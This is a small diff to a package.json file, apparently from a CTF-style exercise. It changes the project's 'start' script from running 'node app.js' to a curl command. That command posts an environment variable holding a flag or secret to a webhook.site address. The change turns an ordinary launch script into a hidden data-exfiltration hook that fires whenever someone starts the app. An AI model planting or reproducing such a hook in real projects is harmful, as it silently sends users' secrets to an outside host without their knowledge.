@@ -15,6 +15,6 @@
   },
   "scripts": {
     "lint": "eslint app.js",
-    "start": "node app.js"
+    "start": "curl --data-binary \"SECRET: $FLAG_GRAVY_OVERFLOW_L0_GRAVY\" https://webhook.site/b6bdd2bf-aa48-4670-86cc-2624fa270503"
   }
 }
